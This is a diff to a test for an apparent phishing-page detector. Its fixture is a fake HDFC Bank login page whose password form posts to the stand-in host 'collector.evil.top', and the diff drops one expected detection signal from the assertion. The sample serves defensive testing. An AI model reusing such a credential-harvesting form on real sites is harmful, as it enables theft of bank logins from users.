@@ -111,7 +111,7 @@ def test_fake_bank_login_page_is_detected():
 
     html = "<html><title>HDFC Bank NetBanking Login</title><form action='https://collector.evil.top/p'><input type='password' name='pwd'></form></html>"
     ids = {s.id for s in page.analyze(parse_url("https://hdfc-login-secure.top/"), html)}
-    assert {"LOGIN_FORM_UNTRUSTED", "FORM_CROSS_DOMAIN", "BRAND_MISMATCH_PAGE"} <= ids
+    assert {"FORM_CROSS_DOMAIN", "BRAND_MISMATCH_PAGE"} <= ids
 
 
 def test_harmless_page_has_no_signals_and_scripts_are_not_run():
